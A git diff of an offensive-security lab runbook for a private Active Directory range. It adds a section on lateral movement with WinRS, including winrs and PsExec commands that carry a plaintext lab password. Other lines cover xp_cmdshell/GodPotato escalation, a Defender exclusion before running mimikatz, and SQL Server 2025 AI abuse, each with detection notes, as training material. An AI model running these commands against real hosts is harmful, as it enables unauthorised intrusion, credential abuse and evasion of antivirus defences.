@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Phase 3 — Execution (SQL xp_cmdshell + alternatives)
+# CAMPAIGNS v3 — Phase 3 — Execution (SQL xp_cmdshell + alternatives)
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -115,6 +115,66 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';
 
 > **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.
 
+---
+
+### Phase 3.5 — Lateral Movement: WinRS from ws01 to mbr01 (T101)
+
+
+||                         |                                                                   |
+|| ----------------------- | ----------------------------------------------------------------- |
+|| **Target**              | mbr01 (192.168.77.22)                                             |
+|| **Source of this path** | analyst_t1 is a member of `Remote Management Users` on mbr01     |
+|| **From**                | ws01 (192.168.77.62) compromised workstation                        |
+|| **What you earn**       | Interactive shell on mbr01 as `child\analyst_t1`                   |
+|| **MITRE**               | T1021.006 (Remote Services: Windows Remote Management)            |
+
+
+In a real-world breach, the operator does **not** run every attack from the initial Kali box. After gaining a foothold on the workstation, the next step is to move laterally to a server that holds more valuable credentials or access paths. `mbr01` is the perfect next hop: it hosts MSSQL, IIS, and is not protected by SMB signing.
+
+**Prerequisites (playbook updates applied):**
+- `analyst_t1` added to `Remote Management Users` local group on mbr01 (`06-member-services.yml`).
+- `ws01` TrustedHosts includes `mbr01.child.cadre.local` and `192.168.77.22` (`17-ws01-deploy.yml`).
+
+**Step 1 — Verify reachability from ws01:**
+
+```powershell
+# Run as child.cadre.local\analyst_t1 on ws01
+Test-NetConnection -ComputerName mbr01.child.cadre.local -Port 5985
+# TcpTestSucceeded : True
+```
+
+**Step 2 — Execute remote command via WinRS:**
+
+```bash
+# From provisioning .60 via ws01-exec harness
+bash ~/CADRE/attack-matrix/04-automation/linux/campaign-a/T101-winrs-pivot-ws01.sh
+# Expected: WINRS_OK: reached mbr01 from ws01
+#           mbr01
+#           User Name         SID
+#           ================  =============================================
+#           child\analyst_t1  S-1-5-21-2616196951-1941128886-767624593-1114
+```
+
+**Step 3 — Optional interactive shell:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! cmd
+# Now running cmd.exe on mbr01 as child\analyst_t1
+```
+
+**Why this is more realistic than CRTP/CRTE/CAPE/GOAD:**
+- CRTP and CRTE run most lateral movement directly from the attacker Kali box with captured credentials.
+- GOAD provides multiple paths but typically guides the operator to run BloodHound/mimikatz from a single compromised Windows host or Kali.
+- **CADRE forces the learner to chain beachheads** and understand identity/context boundaries: the workstation account cannot DCSync a DC, but it can remote-manage `mbr01`, which can then coerce `dc02` or host a relay.
+
+**Detection:**
+- Sysmon EID 1 (`winrs.exe` / `wsmprovhost.exe`) on ws01 and mbr01.
+- WinSec 4624 Logon Type 3 + 4648 on mbr01.
+- Zeek conn.log / Suricata: TCP/5985 between ws01 and mbr01.
+- Elastic EQL: `process where process.name == "wsmprovhost.exe" and user.domain != "WS01$"`.
+
+**Fallback if WinRS blocked:** Use `PsExec` over SMB (`psexec \\mbr01 -u child\analyst_t1 -p T13r_An@lyst! cmd`) or PowerShell remoting with `-Authentication Negotiate`.
+
 ### Phase 3 — Alternative Execution Techniques ⏳
 
 The following techniques are pending testing. They expand Phase 3 beyond xp_cmdshell → GodPotato → SYSTEM.
@@ -151,11 +211,12 @@ Global Assembly Cache (GAC) is a .NET system-wide repository. Hijacking GAC asse
 
 **Detection:** Sysmon EID 11 (file write to `%windir%\Microsoft.NET\assembly\`), EID 7 (image load of unsigned assembly).
 
-#### SQL Server 2025 AI Abuse (T1567, T1218, T1071) ⏳
+#### SQL Server 2025 AI Abuse (T1567, T1218, T1071) ⏳ — Plan 1.1 alt node
 
-**Source:** SpecterOps (2026-06-10)
-**PoC:** [https://github.com/gershsec/mssql2025-poc](https://github.com/gershsec/mssql2025-poc)
-**Study guide:** `study-guide/ref-mssql2025-ai-abuse.md`
+**Source:** SpecterOps (2026-06-10)  
+**PoC:** [https://github.com/gershsec/mssql2025-poc](https://github.com/gershsec/mssql2025-poc)  
+**Study guide:** `study-guide/ref-mssql2025-ai-abuse.md`  
+**Graph:** `alt-sql-ai` after mbr02 SQL access (linked server / Branch C adjacency). Re-verify T042 reachability first ([`T042-REVERIFY.md`](../../docs/internal/plan1.1-campaign-automation/T042-REVERIFY.md)).
 
 mbr02 runs SQL Server 2025 Developer Edition. Three new AI features can be weaponized:
 
